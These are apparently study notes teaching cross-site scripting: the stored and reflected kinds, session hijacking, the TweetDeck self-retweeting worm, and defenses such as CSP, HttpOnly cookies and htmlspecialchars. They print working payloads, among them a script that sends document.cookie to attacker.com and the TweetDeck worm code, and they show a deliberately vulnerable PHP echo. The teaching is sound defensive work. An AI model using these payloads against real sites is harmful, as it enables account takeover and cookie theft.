> [!motivation] The Dangers of Cross-Site Scripting (XSS)
>
> Cross-Site Scripting (XSS) is a prevalent security vulnerability in web applications, where an **attacker injects malicious scripts into web pages viewed by other users**. This type of attack leverages the trust a user has for a particular site, turning benign web pages into vehicles for delivering harmful scripts.

> [!idea] Understanding Stored XSS
>
> Stored Cross-Site Scripting (Stored XSS) occurs when malicious scripts are injected directly into a website's database through user inputs that are not adequately sanitized. These scripts are then delivered to other users' browsers when they access the compromised data.
>
> - **Persistence**: The malicious script persists in the database, affecting multiple users over time.
> - **Scope of Attack**: Can impact any user who accesses the data containing the script.
> - **Mitigation**: Requires stringent input validation and output encoding to prevent and neutralize these attacks.

> [!example] Example of Stored XSS Attack
>
> Consider a user who submits a comment on a blog post with the following malicious JavaScript embedded: `<script>alert('XSS');</script>`. If the comment is stored as-is in the database and then displayed to other users without sanitization, it executes the script in every visitor's browser, potentially leading to wider exploitation.

> [!idea] Exploring Reflected XSS
>
> Reflected Cross-Site Scripting (Reflected XSS) involves injecting a script into a web application that reflects the malicious script back to the user's browser as part of an immediate response. It typically occurs through URL parameters, form inputs, or any other data sent to the server that is then echoed back in the response.
>
> - **Immediate Execution**: The script does not persist in the database but is executed immediately in the user's browser.
> - **Social Engineering**: Often requires tricking a user into clicking a specially crafted link containing the malicious script.
> - **Prevention**: Focuses on validating and encoding user inputs and URL parameters to avoid executing untrusted scripts.

> [!example] Example of Reflected XSS Attack
>
> A user clicks on a link like `http://example.com/search?query=<script>alert('XSS');</script>`. The search term is reflected in the response without sanitization, causing the script to execute in the user's browser. This illustrates how attackers use social engineering to execute their scripts.

> [!consider] Stored vs. Reflected XSS
>
> - **Stored XSS**: Involves malicious scripts that are permanently stored on the server (e.g., in a database) and executed in multiple users' browsers when the stored data is displayed. This type of XSS is particularly harmful as it can affect many users over time. Mitigation includes thorough sanitization of stored data.
>
> - **Reflected XSS**: Occurs when a user's input is immediately returned by web applications without proper sanitization and displayed in the user's browser, executing malicious scripts. This form usually affects the user who sends the input and often requires social engineering to initiate. Preventing this involves real-time sanitization of inputs and outputs.

> [!idea] How XSS Attacks Facilitate Session Hijacking via Cookie Theft
>
> Cross-Site Scripting (XSS) can enable session hijacking by allowing attackers to inject scripts that covertly steal session cookies and send them to a malicious server. This attack bypasses the need for direct user interaction, making it harder to detect.
>
> - **Mechanism**: Attackers leverage XSS vulnerabilities to inject a script that accesses the session cookie and sends it to their server using an AJAX POST request. This approach keeps the user on the original page, maintaining the illusion of security.
> - **Impact**: Once the attacker obtains the session cookie, they can use it to impersonate the victim, accessing their account and sensitive data.
> - **Example**: An attacker injects the following script into a vulnerable web application:
>   ```javascript
>   var xhr = new XMLHttpRequest();
>   xhr.open("POST", "http://attacker.com/steal", true);
>   xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
>   xhr.send("session=" + encodeURIComponent(document.cookie));
>   ```
>   This script creates an XMLHttpRequest to send the session cookie to the attacker's server without disrupting the user's experience, effectively hijacking the session.

> [!example] Real Example: Self-Retweeting Tweet in TweetDeck
>
> The XSS attack that affected TweetDeck used the following JavaScript snippet embedded in a tweet:
>
> ```html
> <script class="xss">$('.xss').parents().eq(1).find('a').eq(1).click();$('[data-action=retweet]').click();alert('XSS in Tweetdeck')</script>♥
> ```
>
> - **Targeting the Script Element**: `$('.xss')` selects the `<script>` element itself using its class name 'xss'.
> - **Navigating the DOM**: `$('.xss').parents().eq(1)` navigates up the DOM to find the parent element of the `<script>` tag. This is typically a container like a `<div>` or `<span>` that contains the tweet.
> - **Finding and Clicking a Link**: `.find('a').eq(1).click();` looks for the second link within this parent container and simulates a click. This step could be designed to interact with other parts of the TweetDeck interface or to trigger additional actions like navigating or opening links.
> - **Triggering the Retweet**: `$('[data-action=retweet]').click();` specifically targets elements (usually buttons) with a `data-action` attribute set to 'retweet' and simulates a click, which causes the tweet to retweet itself.
> - **Alerting the User**: `alert('XSS in Tweetdeck')` then pops up an alert box, providing feedback that the XSS script executed, serving as a proof of concept for the attacker.

> [!consider] Comprehensive XSS and Session Hijacking Defense
>
> Protecting against XSS and session hijacking requires a multi-layered approach:
>
> - **Input Validation**: Sanitize and filter all user input to remove XSS payloads.
> - **Output Encoding**: Encode user data before rendering to treat scripts as plain text.
> - **Secure Frameworks**: Use frameworks with built-in XSS protection features.
> - **Content Security Policy (CSP)**: Whitelist trusted sources for scripts, styles, and resources to block injected scripts.
>
>   ```
>   Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com; object-src 'none'; base-uri 'self'; form-action 'self'
>   ```
>
>   This CSP allows scripts only from the site origin and `https://trusted.com`, blocks plugins/objects, restricts base URLs and form submissions.
>
> - **Secure Cookie Handling**: Use `HttpOnly` and `Secure` flags to prevent client-side script access to session cookies.
> - **Short Session Timeouts**: Minimize session hijacking window with short timeouts and re-authentication.
> - **Session Token Rotation**: Rotate tokens after sensitive operations to invalidate stolen tokens.
> - **CSRF Protection**: Implement CSRF countermeasures to prevent unauthorized state changes.
>


> [!example] Preventing XSS
>
> To effectively prevent XSS attacks, user input must be sanitized before it is rendered on the web page. Below are examples of how a specific input is transformed using PHP's sanitization functions.
>
> **Before Sanitization:**
> User input: `<script>alert('XSS');</script>`
>
> **PHP Code Before Sanitization:**
> ```php
> // Displaying user input directly
> echo $_POST['user_input'];
> ```
> This will execute the JavaScript and show an alert if `user_input` is `<script>alert('XSS');</script>`.
>
> **After Sanitization Using `htmlspecialchars`:**
> **PHP Code After Sanitization:**
> ```php
> // Sanitizing user input to prevent XSS
> $safe_input = htmlspecialchars($_POST['user_input'], ENT_QUOTES, 'UTF-8');
> echo $safe_input;
> ```
> With this sanitized input, the output in HTML will be: `&lt;script&gt;alert('XSS');&lt;/script&gt;`, which is rendered as text rather than being executed as JavaScript. This approach prevents the script from running and neutralizes the XSS threat.
>
> By combining these measures, web applications can effectively mitigate XSS vulnerabilities, prevent session hijacking, and enhance the overall security posture against various types of attacks targeting user sessions and sensitive data.
